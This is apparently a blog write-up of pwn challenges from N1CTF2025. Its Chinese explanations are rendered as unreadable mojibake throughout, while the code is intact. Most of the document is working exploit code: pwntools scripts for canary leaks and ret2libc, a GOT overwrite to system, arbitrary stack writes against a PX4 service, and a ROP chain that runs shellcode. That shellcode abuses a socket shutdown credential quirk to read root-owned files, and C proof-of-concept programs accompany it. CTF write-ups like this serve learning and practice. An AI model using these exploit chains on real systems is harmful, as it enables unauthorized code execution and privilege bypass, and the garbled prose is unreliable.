export const layout = "#components/Page.js";
export const title = "N1CTF2025 Writeup";
export const description = "";
export const created = "2025-11-05T15:29:18+08:00";

# N1CTF2025 Pwn Writeup

å¥½å¥½ç©çš„æ¯”èµ›ï¼ˆx

## nipple

é™„ä»¶ç”¨ ida æ‰“å¼€ä¹‹åè¿”ç°å¾ˆğŸ’©ï¼Œc++ å†™çš„ï¼Œéå¸¸ä¸å¥½çœ‹ï¼Œä½†æ˜¯ä»£ç é‡ä¸å¤§ï¼Œç›´æ¥ä¸¢ç»™ AI åˆ†æä¸€ä¸‹ã€‚

AI å¤ªå¥½ç”¨äº†ä½ çŸ¥é“å—ï¼ŒåŸºæœ¬ä¸Šè¿™é“é¢˜çš„ä¸‰ä¸ªæ´ï¼šä¿¡æ¯æ³„æ¼ã€æ ˆæº¢å‡ºã€å †æº¢å‡ºéƒ½æ‰¾åˆ°äº†ã€‚

ä¿¡æ¯æ³„æ¼æ˜¯æ¯æ¬¡ crate åˆ›å»ºåæ²¡æœ‰æ¸…ç©ºï¼Œåˆ©ç”¨ show å¯ä»¥æ³„æ¼ pie å’Œ libcã€‚ä½†æ˜¯ repack åŠŸèƒ½æœ‰ç‚¹å˜æ€ï¼Œå®ƒä¼šæŠŠå½¢å¦‚ 0x61 è¿™ç§å•å­—èŠ‚æ‹†åˆ†æˆ 0x06 å’Œ 0x01 åˆ†åˆ«å†™å…¥ï¼Œä¹Ÿå°±æ˜¯æ²¡åŠæ³•åœ¨å †ä¸Šå†™å…¥æŒ‡é’ˆäº†ã€‚

é‚£ tcache posioning åŸºæœ¬æ‰“ä¸äº†äº†ï¼Œè€ƒè™‘æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰ canaryï¼Œæ€ä¹ˆæ³„æ¼å‘¢.jpg

å‘ç°å¦‚æœé€šè¿‡ chunk overlap æŠŠ tcache chunk çš„ fd å’Œ canary é‡å èµ·æ¥ï¼Œåœ¨åŠ å¯†å‡½æ•°æ—¶ï¼Œå°±ä¼šæŠŠ canary çš„æ¯ä¸ªå­—èŠ‚çš„ä½åŠå­—èŠ‚å’Œ fd çš„é«˜åŠå­—èŠ‚æ‹¼èµ·æ¥ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠ canary æœ€ä½ä½çš„ `\x00` ç›–æ‰ï¼Œç„¶åå°± leak å‡ºæ¥äº†ã€‚

åé¢æ‰“ ret2libc å°±è¡Œã€‚

```python
#!/usr/bin/env python3
from pwn import *
import os
context.binary = "./attachment"
context.log_level = "debug"
BIN = './attachment'
libc = ELF('./libc.so.6')
HOST = os.environ.get('HOST')
PORT = int(os.environ.get('PORT', '0'))
# io = remote("60.205.163.215", 36593)
io = process(BIN)


if args.G:
    gdb.attach(io, """
    breakrva 0x2a5f
    """)


def new(io, n):
    io.sendlineafter(b'Choice:', b'1')
    io.sendlineafter(b'Length', str(n).encode())
    io.recvuntil(b'Data:')
    io.sendline(b'')
    io.recvuntil(b'[OK]')

def inspect(io, i=0):
    io.recvuntil(b'Choice:')
    io.sendline(b'2')
    io.sendlineafter(b'Index:', str(i).encode())

def repack(io, i, n, data):
    io.recvuntil(b'Choice:')
    io.sendline(b'4')
    io.sendlineafter(b'Index:', str(i).encode())
    io.sendlineafter(b'Length', str(n).encode())
    io.recvuntil(b'Data:')
    io.send(data)
    io.recvuntil(b'[OK]')

def quit(io):
    io.sendline(b'7')

def poc_leak():
    io = spawn()
    new(io, 1024)
    leak = inspect(io, 0)
    log.info(f'leak len={len(leak)}')
    quit(io)
    io.close()

def poc_heap():
    io = spawn()
    new(io, 10)
    repack(io, 0, 22, b'B'*21)
    quit(io)
    io.close()

def poc_stack():
    io = spawn()
    new(io, 64)
    io.sendlineafter(b'Choice:', b'4')
    io.sendlineafter(b'Index:', b'0')
    io.sendlineafter(b'Length', b'128')
    io.recvuntil(b'Data:')
    io.sendline(b'C'*127)
    io.close()


for i in range(2):
    new(io, 0x500)
inspect(io, 1)
libc_base = u64(io.recvuntil(b'\x0a')[-7:-1].ljust(8, b'\x00')) - 0x203b20

for i in range(2):
    new(io, 0x10)
inspect(io, 2)
heap_leak = u64(io.recvuntil(b'\x0a')[-6:-1].ljust(8, b'\x00')) << 12
repack(io, 2, 0x20, b'a' * 0x18 + b'\x0a' + b'\x0a')  # 35CD
print(hex(heap_leak))
print(hex(libc_base))

inspect(io, 2)
io.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaa")
canary = u64(io.recvuntil(b"\x06\n", drop=True))
print(hex(canary))

pop_rdi_ret = 0x000000000010f78b+libc_base
system = libc_base + libc.sym['system']
binsh = next(libc.search(b"/bin/sh\x00")) + libc_base
ret = libc_base + 0x000000000002882f

payload = b"a" * 0x18 + p64(canary) + b"a" * 0x38 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
repack(io, 1, len(payload), payload)

io.interactive()
```


~~è„šæœ¬çš„äº¤äº’éƒ¨åˆ†æ˜¯ AI ä¸€æŠŠæ¢­çš„ï¼Œæœ‰ç‚¹ä¸‘~~


## ktou

è¿˜ä»¥ä¸ºæ˜¯ kernel pwnï¼Œå…¶å®è¿˜æ˜¯ç”¨æˆ·æ€ã€‚

![æ¼æ´ç‚¹](https://pic1.imgdb.cn/item/690b14f23203f7be00d60d45.png)

è¿™ä¸ªåœ°æ–¹å­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œå¯ä»¥æ‹¿åˆ°ç”¨æˆ·æ€ä»»æ„åœ°å€è¯»å†™çš„åŸè¯­ã€‚

User ç¨‹åº got è¡¨å¯å†™ï¼ŒåŠŸèƒ½ 5 æœ‰ `puts(dest)`ï¼ŒæŠŠ dest å†™æˆ binshï¼Œputs@got å†™æˆ `system` å³å¯ã€‚

```python
#!/usr/bin/env python3
from pwn import *
import os
import base64
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"
BIN = './core/user'
libc=ELF('./libc.so.6')
io = remote("60.205.163.215", 60007)

def choose(idx):
    io.sendlineafter(b'> ',str(idx))
def kwrite(idx,size,data):
    choose(2)
    io.sendlineafter(b': ',str(idx))
    io.sendlineafter(b': ',str(size))
    io.sendlineafter(b': ',data)

def kappend(idx,size,data):
    choose(3)
    io.sendlineafter(b': ',str(idx))
    io.sendlineafter(b': ',str(size))
    io.sendlineafter(b': ',data)
def kwdescription(data):
    choose(5)
    io.sendlineafter(b':',data)

#io.sendline(b'aaa')
kwrite(1,0xf0,p64(0xdeadbeef))
kappend(0xf,0xff,p64(0x405050)+p64(0xdeadbeef))
choose(4)
io.recvuntil(b'content:\x20\x0d\x0a')

system = u64(io.recv(6).ljust(8,b'\x00')) + libc.sym['system'] - 0x606f0
kappend(0xf,0xff,p64(0x405220)+p64(0xdeadbeef))

payload=base64.b64encode(b'/bin/sh\x00\x00')
kwdescription(payload)
kappend(0xf,0xff,p64(0x405030)+p64(0xdeadbeef))
payload=base64.b64encode(p64(system))
kwdescription(payload)

io.interactive()
```


## n1drone

å…ˆç”¨ dockerfile.run æ–‡ä»¶æŠŠç¯å¢ƒæ­å‡ºæ¥ï¼Œç®€å•æµ‹è¯•ä¸€ä¸‹åŠŸèƒ½ã€‚

çœ‹ä¸€ä¸‹å‡ºé¢˜äººç»™çš„ n1_sub_manager_main.cppï¼Œç›¸å½“äºç»™äº†ä»»æ„åœ°å€è¯»å†™çš„åŸè¯­ã€‚

å¦å¤–å‘ç° `list_tasks` å¯ä»¥æ³„æ¼ `tls` åœ°å€ï¼Œåœ¨å®ƒä¸‹é¢å°±æœ‰ libc æŒ‡é’ˆå’Œ stack æŒ‡é’ˆã€‚

éé¢„æœŸï¼šé€šè¿‡ `bsondump /proc/self/maps` å¯ä»¥æ³„æ¼ pie å‡ºæ¥ã€‚

æœ‰äº†æ ˆåœ°å€ï¼Œå¯ä»¥åƒå †é¢˜æ‰“ `environ` ä¸€æ ·ï¼Œç›´æ¥å»æ‰“ edit chunk é‚£ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™ä¸ªé¢˜å°±æ˜¯ç›´æ¥æ‰“ `n1_sub_manager write` çš„è¿”å›åœ°å€å°±å¯ä»¥äº†

```python
from pwn import *
from sys import argv

proc = "./run/bin/px4"
context.log_level = "info"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("127.0.0.1", 8080) if argv[1] == 'r' else process(proc)
libc = ELF("./libc.so.6")


def choose(cmd):
    io.sendlineafter(b"pxh>", cmd)


def arbread(addr):
    cmd = f"n1_sub_manager write 0x24 {hex(addr)}"
    choose(cmd.encode())
    choose(b"listener debug_key_value")
    io.recvuntil(b"timestamp: ")
    return int(io.recvuntil(b" (", drop=True))


def arbwrite(addr, content):
    cmd = f"n1_sub_manager write 0x23 {hex(addr)}"
    choose(cmd.encode())
    cmd = "n1_sub_manager publish 0x23"
    choose(cmd.encode())
    io.send(content)


cmd = "n1_sub_manager publish 0x24"
choose(cmd.encode())
io.sendline(b"a" * 0x2)
choose(b"list_tasks")
io.recvuntil(b"hpwork")
tls_addr = int(io.recvuntil(b"\n", drop=True))
log.info(f"tls_addr => {hex(tls_addr)}")

leak_addr = arbread(tls_addr + 0x2f8)
log.info(f"leak_addr => {hex(leak_addr)}")

libc_addr = arbread(leak_addr) - 0x93720
log.info(f"libc_addr => {hex(libc_addr)}")

pop_rdi_ret = libc_addr + 0x000000000002a3e5
ret = pop_rdi_ret + 1
system = libc_addr + libc.sym['system']
binsh = libc_addr + next(libc.search(b"/bin/sh\x00"))

leak_addr = arbread(tls_addr + 0x300)
log.info(f"leak_addr => {hex(leak_addr)}")
stack_addr = arbread(leak_addr)
log.info(f"stack_addr => {hex(stack_addr)}")

cmd = "n1_sub_manager publish 0x23"
choose(cmd.encode())
io.send(b"\x00" * 0x40)
pause()
arbwrite(stack_addr - 0x28, flat([pop_rdi_ret, binsh, ret, system]).ljust(0x100, b"\x00"))

io.interactive()
```

åƒè¿™ç§é™„ä»¶è¿è¡Œåœ¨ docker é‡Œï¼Œé€šè¿‡ `socat` è½¬å‘ stdin/stdout åˆ°ç«¯å£çš„é¢˜ç›®ï¼Œä¸€èˆ¬è°ƒè¯•éƒ½æ˜¯ç”¨ `socat TCP-LISTEN:8083,fork EXEC:"gdbserver \:9999 ./bin/px4"` è°ƒè¯•çš„ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®å¯åŠ¨è„šæœ¬é‡Œæœ‰ `echo` å‘½ä»¤ï¼Œç”±äº stdin/stdout è¢«è½¬å‘äº†ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ã€‚

æœ‰ä¸€ä¸ªæ›´ç®€å•çš„åŠæ³•æ˜¯ï¼Œç”±äº docker æ˜¯é€šè¿‡ namespace å®ç°çš„ï¼Œæœ¬æœºä¸Šæ˜¯å¯ä»¥ç›´æ¥æ‰¾åˆ°è¿›ç¨‹çš„ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥ä¸ç”¨ gdbserverï¼Œç›´æ¥å…ˆ `nc` ä¸Šå»ï¼Œç„¶å `gdb -pid <pid>` è°ƒè¯•ï¼Œè¿™æ ·å°±èƒ½å‘ç°ä»»æ„åœ°å€å†™çš„æ—¶å€™çš„ä¸€äº›å‘2333ã€‚


å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œç»™ä¸œé£å¸ˆå‚…ç‚¹èµã€‚

## n1flgsrv

è¿™ä¸ªé¢˜å¾ˆå¥½ç©ï¼Œç»™äº†ä¸€ä¸ª `srv` ç¨‹åºå’Œ `cli` ç¨‹åºã€‚

ä¸»è¦å…³æ³¨ init æ–‡ä»¶çš„è¿™ä¸¤è¡Œï¼š

```bash
chroot /srv /srv & >/dev/null 2>/dev/null
chrooot 1337 1337 /cli /cli
```

ç®€å•è§£é‡Šä¸€ä¸‹ï¼Œ`srv` è¿›ç¨‹ä»¥ root (uid 0) èº«ä»½è¿è¡Œï¼Œå…¶ chroot æ ¹ç›®å½•æ˜¯ `/srv`ã€‚`cli` è¿›ç¨‹ä»¥ uid 1337 èº«ä»½è¿è¡Œï¼Œå…¶ chroot æ ¹ç›®å½•æ˜¯ `/cli`ã€‚

å½“æˆ‘ä»¬è¿æ¥åˆ° `n1ctf.2025.remote:13227` æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆäº¤äº’çš„æ˜¯ `cli` è¿›ç¨‹ã€‚

é¦–å…ˆåˆ†æ cliï¼Œç¨‹åºæ‰£äº†ç¬¦å·è¡¨ï¼Œå¯ä»¥ç”¨ sig æ–‡ä»¶ç®€å•æ¢å¤ä¸€ä¸‹ï¼Œç„¶åæ‹–ç»™ ai åˆ†æï¼ˆæˆ‘æŠŠç”¨åˆ°çš„ sig æ–‡ä»¶æ”¾åœ¨ç›®å½•ä¸‹äº†ï¼‰ã€‚

é€†å‘ä¸€ä¸‹é€»è¾‘ï¼Œå‘ç° `sub_4EC110((unsigned int)"%[^\n]%1[\n]", (unsigned int)v62, ...)` è¿™ä¸€è¡Œæ˜¯ `scanf("%[^\n]", v62)`ã€‚`scanf` æ²¡æœ‰æ£€æŸ¥è¾“å…¥çš„é•¿åº¦ï¼Œå®ƒä¼šæ— é™åœ°å†™å…¥ `v62`ï¼Œå¯¼è‡´ç»å…¸çš„æ ˆæº¢å‡ºã€‚

ç„¶ååˆ†æä¸€ä¸‹ srvï¼Œæ¢å¤ç¬¦å·åï¼Œç®€å•é€†å‘ï¼Œå‘ç°å¤§æ¦‚åŠŸèƒ½æ˜¯ï¼šè¯»å…¥ä¸€ä¸ªæ–‡ä»¶åï¼Œå°è¯•è¯»å–ï¼Œå¦‚æœæ–‡ä»¶çš„ owner æ˜¯ rootï¼Œå°±è¿”å›æ–‡ä»¶å†…å®¹ï¼Œè¿™ä¸ªé€»è¾‘æœ¬èº«æ˜¯æ²¡ä»€ä¹ˆæ¼æ´çš„ï¼Œé—®é¢˜æ˜¯ç»è¿‡ä¸Šé¢çš„ `chroot` ä¹‹åï¼Œå½“å‰è¿›ç¨‹çš„ uid æ˜¯ 1337ï¼Œå½“æˆ‘ä»¬é€šè¿‡ cli å’Œ srv äº¤äº’å‘é€ä¸€ä¸ª `/flag` æ—¶ï¼Œsrv æ£€æŸ¥å‘ç° flag æ–‡ä»¶çš„ owner æ˜¯ 0ï¼Œæ— æ³•è¯»å– flagã€‚

è¡¥å……ä¸€äº›çŸ¥è¯†ï¼š

### SCM_CREDENTIALS

`SCM_CREDENTIALS` æ˜¯ä¸€ä¸ªåœ¨ Linux/Unix ç³»ç»Ÿä¸­ç”¨äºåœ¨è¿›ç¨‹é—´ä¼ é€’èº«ä»½å‡­è¯çš„æœºåˆ¶ã€‚

ä¸ºäº†å®Œå…¨ç†è§£å®ƒï¼Œæˆ‘ä»¬å…ˆé€€ä¸€æ­¥ï¼Œçœ‹çœ‹å®ƒè§£å†³äº†ä»€ä¹ˆé—®é¢˜ã€‚

#### 1. é—®é¢˜ï¼šæœåŠ¡å™¨å¦‚ä½•ä¿¡ä»»å®¢æˆ·ç«¯ï¼Ÿ

æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æœ‰ä¸€ä¸ªç‰¹æƒæœåŠ¡å™¨ï¼ˆæ¯”å¦‚ `srv`ï¼‰ï¼Œå®ƒç›‘å¬ä¸€ä¸ª UNIX å¥—æ¥å­—ã€‚

ä¸€ä¸ªå®¢æˆ·ç«¯ï¼ˆæ¯”å¦‚ `cli`ï¼‰è¿æ¥åˆ°å®ƒï¼Œå¹¶å‘é€ä¸€ä¸ªè¯·æ±‚ï¼šâ€œè¯·è¯»å– `/flag` æ–‡ä»¶â€ã€‚

`srv` è¿›ç¨‹å¦‚ä½•çŸ¥é“è¿™ä¸ªè¯·æ±‚æ˜¯è°ï¼ˆå“ªä¸ªç”¨æˆ·ï¼‰å‘å‡ºçš„ï¼Ÿ

  * `srv` ä¸èƒ½ä¿¡ä»» `cli` å‘é€çš„æ•°æ®ã€‚`cli` ä¸èƒ½ç®€å•åœ°åœ¨æ¶ˆæ¯é‡Œè¯´ï¼šâ€œä½ å¥½ï¼Œæˆ‘æ˜¯ uid 1337â€ã€‚è¿™å¤ªå®¹æ˜“ä¼ªé€ äº†ã€‚
  * `srv` éœ€è¦ä¸€ç§**æ— æ³•ä¼ªé€ **çš„æ–¹å¼æ¥è·å– `cli` çš„çœŸå®ç”¨æˆ· ID (UID)ã€‚

#### 2. è§£å†³æ–¹æ¡ˆï¼š`SO_PASSCRED` å’Œ `SCM_CREDENTIALS`

`SCM_CREDENTIALS` å°±æ˜¯è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆã€‚å®ƒä»£è¡¨ **S**ocket-**C**ontrol-**M**essage **CREDEN**TIALSï¼ˆå¥—æ¥å­—æ§åˆ¶æ¶ˆæ¯ - å‡­è¯ï¼‰ã€‚

è¿™æ˜¯ä¸€ä¸ªä¸¤æ­¥çš„è¿‡ç¨‹ï¼š

**ç¬¬ 1 æ­¥ï¼šæœåŠ¡å™¨å¼€å¯â€œå‡­è¯æ¥æ”¶â€æ¨¡å¼**

  * `srv`ï¼ˆæœåŠ¡å™¨ï¼‰åœ¨ä¸ `cli`ï¼ˆå®¢æˆ·ç«¯ï¼‰å»ºç«‹è¿æ¥åï¼Œå¿…é¡»å¯¹è¯¥è¿æ¥çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆ`fd`ï¼‰è®¾ç½®ä¸€ä¸ªé€‰é¡¹ï¼š
    ```c
    int enable = 1;
    setsockopt(client_fd, SOL_SOCKET, SO_PASSCRED, &enable, sizeof(enable));
    ```
  * `sub_4075F0` å‡½æ•°ä¸­çš„ `sub_5351A0(v10, 1, 16, &v16, 4)` **åšçš„å°±æ˜¯è¿™ä»¶äº‹**ã€‚
  * `SO_PASSCRED` (Pass Credentials) é€‰é¡¹å‘Šè¯‰ Linux å†…æ ¸ï¼šâ€œ**è¯·åœ¨æ¯æ¬¡ä»è¿™ä¸ªå¥—æ¥å­—æ¥æ”¶æ•°æ®æ—¶ï¼ŒæŠŠå‘é€æ–¹çš„çœŸå®å‡­è¯ï¼ˆPID, UID, GIDï¼‰ä¹Ÿä¸€å¹¶äº¤ç»™æˆ‘ã€‚**â€

**ç¬¬ 2 æ­¥ï¼šæœåŠ¡å™¨ä½¿ç”¨ `recvmsg` æ¥æ”¶å‡­è¯**

  * å½“ `cli` å‘é€æ•°æ®æ—¶ï¼Œ`srv` ä¸èƒ½å†ä½¿ç”¨ç®€å•çš„ `read()` æˆ– `recv()`ã€‚å®ƒå¿…é¡»ä½¿ç”¨ `recvmsg()`ã€‚
  * `recvmsg()` æ˜¯ä¸€ä¸ªæ›´é«˜çº§çš„å‡½æ•°ï¼Œå®ƒå…è®¸åœ¨æ¥æ”¶â€œå¸¸è§„æ•°æ®â€çš„åŒæ—¶ï¼Œæ¥æ”¶â€œ**æ§åˆ¶æ¶ˆæ¯**â€ï¼ˆControl Messageï¼Œå³ `cmsg`ï¼‰ã€‚
  * å½“ `cli` å‘é€æ¶ˆæ¯æ—¶ï¼ŒLinux å†…æ ¸ä¼šä»‹å…¥ï¼š
    1.  å®ƒæŸ¥çœ‹ `cli` è¿›ç¨‹ï¼Œç¡®è®¤å…¶çœŸå® UID æ˜¯ 1337ã€‚
    2.  å®ƒå°† `cli` çš„æ•°æ®ï¼ˆä¾‹å¦‚ `"/flag"`ï¼‰æ”¾å…¥â€œå¸¸è§„æ•°æ®â€ç¼“å†²åŒºã€‚
    3.  å®ƒåˆ›å»ºä¸€ä¸ª**æ§åˆ¶æ¶ˆæ¯**ï¼Œç±»å‹ä¸º `SCM_CREDENTIALS`ï¼Œå†…å®¹ä¸º `(pid, uid=1337, gid=1337)`ã€‚
    4.  å®ƒå°†è¿™ä¸ªæ§åˆ¶æ¶ˆæ¯æ”¾å…¥â€œæ§åˆ¶æ¶ˆæ¯â€ç¼“å†²åŒºã€‚
    5.  `srv` çš„ `recvmsg()` è°ƒç”¨è¿”å›ï¼Œ`srv` ç°åœ¨åŒæ—¶æ‹¥æœ‰äº†æ•°æ® (`"/flag"`) å’Œä¸€ä¸ª**ç”±å†…æ ¸æ‹…ä¿ã€æ— æ³•ä¼ªé€ **çš„å‡­è¯ï¼ˆ`uid=1337`ï¼‰ã€‚


è€Œ `shutdown` å‡½æ•°ï¼Œå¯ä»¥åšåˆ°è®© srv è·å¾—ä¸€ä¸ª uid = 0 çš„ç©ºå‡­è¯ã€‚

1. å½“å®¢æˆ·ç«¯ `shutdown` æ—¶ï¼Œ`sk->sk_peer_cred` ä¼šè¢«è®¾ç½®ä¸º `NULL`
2. srv éšåè°ƒç”¨ recvmsg æ¥æ”¶ EOF
3. é€šè¿‡ä¸‹é¢è¿™ä¸ªå‡½æ•°è®¾ç½® `client->uid = 0`


```c
static void unix_get_peereid(struct socket *sock, struct ucred *ucred)
{
    struct sock *sk = sock->sk;
    const struct cred *peercred;

    /*
     * We can't return PID of peer for an unconnected socket.
     * We are not allowed to return credentials of not-our-peer.
     */
    if (sk->sk_peer_cred == NULL) {
        /*
         * sk_peer_cred is cleared in unix_shutdown()
         * or when the peer is garbage collected.
         */
        peercred = &init_cred; // <-- å…³é”®ç‚¹ 1
    } else {
        peercred = sk->sk_peer_cred;
    }

    ucred->pid = 0; // PID ä¸æ€»æ˜¯å¯ç”¨çš„
    ucred->uid = peercred->uid; // <-- å…³é”®ç‚¹ 2
    ucred->gid = peercred->gid;
}
```


æ¥çœ‹ä¸‹é¢è¿™ä¸ª poc:

`server.c`ï¼š

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>

#define SOCKET_PATH "shutdown_quirk.sock"

int main() {
    int server_fd, client_fd;
    struct sockaddr_un server_addr;

    server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    unlink(SOCKET_PATH);

    memset(&server_addr, 0, sizeof(struct sockaddr_un));
    server_addr.sun_family = AF_UNIX;
    strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_un)) == -1) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 5) == -1) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    printf("Server listening on %s\n", SOCKET_PATH);

    client_fd = accept(server_fd, NULL, NULL);
    if (client_fd == -1) {
        perror("accept");
        exit(EXIT_FAILURE);
    }
    printf("Client connected.\n");

    int enable = 1;
    if (setsockopt(client_fd, SOL_SOCKET, SO_PASSCRED, &enable, sizeof(enable)) == -1) {
        perror("setsockopt(SO_PASSCRED)");
        exit(EXIT_FAILURE);
    }
    printf("SO_PASSCRED enabled.\n");

    struct msghdr msg = {0};
    struct iovec iov[1] = {0};
    char buf[1];

    iov[0].iov_base = buf;
    iov[0].iov_len = sizeof(buf);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    char cmsg_buf[CMSG_SPACE(sizeof(struct ucred))] = {0};
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    printf("Waiting for recvmsg()...\n");
    ssize_t n = recvmsg(client_fd, &msg, 0);

    if (n == -1) {
        perror("recvmsg");
        exit(EXIT_FAILURE);
    }

    printf("recvmsg() returned %zd (EOF)\n", n);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg == NULL) {
        printf("No control message (cmsg) received.\n");
        exit(EXIT_FAILURE);
    }

    if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_CREDENTIALS) {
        printf("Received SCM_CREDENTIALS.\n");
        struct ucred *creds = (struct ucred *)CMSG_DATA(cmsg);

        printf("----------------------------------\n");
        printf("  PID: %d\n", creds->pid);
        printf("  UID: %u\n", (unsigned int)creds->uid); /* ä¿®æ­£ï¼šä½¿ç”¨ %u æ‰“å° uid_t */
        printf("  GID: %u\n", (unsigned int)creds->gid); /* ä¿®æ­£ï¼šä½¿ç”¨ %u æ‰“å° gid_t */
        printf("----------------------------------\n");

        if (creds->uid == 0 && creds->gid == 0) {
            printf("SUCCESS: Kernel quirk verified! Received null credentials.\n");
        } else {
            printf("FAILURE: Received non-null credentials.\n");
        }

    } else {
        printf("Received an unknown control message.\n");
    }

    close(client_fd);
    close(server_fd);
    unlink(SOCKET_PATH);
    return 0;
}
```


`client.c`ï¼š

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>

#define SOCKET_PATH "shutdown_quirk.sock"

int main() {
    int client_fd;
    struct sockaddr_un server_addr;

    client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (client_fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(struct sockaddr_un));
    server_addr.sun_family = AF_UNIX;
    strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1);

    if (connect(client_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_un)) == -1) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    printf("Connected to server.\n");

    printf("Calling shutdown(SHUT_WR)...\n");
    if (shutdown(client_fd, SHUT_WR) == -1) {
        perror("shutdown");
        exit(EXIT_FAILURE);
    }

    printf("Waiting for 2 seconds before closing...\n");
    sleep(2);

    close(client_fd);
    printf("Client exiting.\n");
    return 0;
}
```

ç¼–è¯‘ï¼Œè¿è¡Œï¼Œå‘ç°ï¼š

```
$ ./server
Server listening on shutdown_quirk.sock
Client connected.
SO_PASSCRED enabled.
Waiting for recvmsg()...
recvmsg() returned 0 (EOF)
Received SCM_CREDENTIALS.
----------------------------------
PID: 0
UID: 0
GID: 0
----------------------------------
SUCCESS: Kernel quirk verified! Received null credentials.
```

æ‰€ä»¥åªéœ€è¦æ ˆæº¢å‡ºï¼Œæ‰§è¡Œ shellcode å°±å¯ä»¥ï¼Œshellcode é€»è¾‘å¦‚ä¸‹ï¼š

1. `read(0, ...)` è¯»å…¥ `b"/flag\x00"` å­—ç¬¦ä¸²
2. `write(3, ...)`ï¼šå°† `/flag` è·¯å¾„å†™å…¥ `fd 3`ï¼Œå‘é€ç»™ srvã€‚
3. `shutdown(3)`ï¼šshellcode å…³é—­äº† `fd 3` çš„å†™å…¥ç«¯ï¼Œä¸”è®¾ç½® `uid = 0`
4. `read(3, ...)`ï¼šä» `fd 3` è¯»å– srv çš„å“åº”ï¼ˆå³ flagï¼‰ã€‚
5. `write(1, ...)`ï¼šå°†å“åº”ï¼ˆflagï¼‰å†™å…¥ `fd 1`ï¼ˆstdoutï¼‰ï¼Œä»è€Œæ”¶åˆ° flagã€‚


æ³¨æ„ `shutdown` å’Œ `close` çš„åŒºåˆ«ï¼š

`close(fd)` åšä¸¤ä»¶äº‹ï¼š

1. å…³é—­å†™å…¥ä¿¡é“ï¼ˆå‘æœåŠ¡å™¨å‘é€ FIN åŒ…ï¼Œå‘Šè¯‰å®ƒâ€œæˆ‘å‘å®Œäº†â€ï¼‰ã€‚
2. å…³é—­è¯»å–ä¿¡é“ï¼ˆä¸å†æ¥æ”¶æ¥è‡ªæœåŠ¡å™¨çš„æ•°æ®ï¼‰ã€‚

`shutdown(fd, SHUT_WR)`ï¼ˆSHUT_WR = Shutdown Writeï¼‰æ˜¯ä¸€ä¸ªæ›´ç²¾ç»†çš„å‡½æ•°ã€‚å®ƒåªåšä¸€ä»¶äº‹ï¼š

1. å…³é—­å†™å…¥ä¿¡é“ï¼ˆå‘æœåŠ¡å™¨å‘é€ FIN åŒ…ï¼Œå‘Šè¯‰å®ƒâ€œæˆ‘å‘å®Œäº†â€ï¼‰ã€‚
2. ä½†å®ƒä¿æŒè¯»å–ä¿¡é“å¤„äºæ‰“å¼€ (OPEN) çŠ¶æ€ï¼


exp å¦‚ä¸‹ï¼š

```python
from pwn import *
import os
import time

context.log_level = 'debug'
context.arch = 'amd64'
p = remote("n1ctf.2025.remote", 13227)

if True:
    p.recvuntil(b'use `kctf-pow solve` to prove yourself :)')
    p.recvline()
    pow = p.recvline(False).decode()
    ans = os.popen(f'./kctf-pow solve {pow}', 'r').read()
    p.sendline(ans)

MPROTECT = 5488848
READ = 5485696
SC = asm('lea rbp,[rsp-512]\n' +
         shellcraft.read(0, 'rbp', 256) +
         shellcraft.write(3, 'rbp', 256) +
         'mov rsi,1' +
         shellcraft.shutdown(3) +
         shellcraft.read(3, 'rbp', 256) +
         shellcraft.write(1, 'rbp', 256) +
         "int3")


def call3(a1, a2, a3, call):
    return p64(0x407630) + p64(a1) + p64(0x44ccfe) + p64(a2) + p64(0x4bdf0c) + p64(a3) + p64(call)


payload = [
    b'a' * 0x138,
    call3(0x400000, 0x2000, 7, MPROTECT),
    call3(0, 0x400000, len(SC), READ),
    p64(0x400000)
]
payload = b''.join(payload)

p.recvuntil(b'(Ctrl+D to exit):')
time.sleep(2)
p.sendline(util.fiddling.tty_escape(payload))

pause()
p.send(util.fiddling.tty_escape(SC))

pause()
p.send('/flag'.rjust(256, '/'))

p.interactive()
```
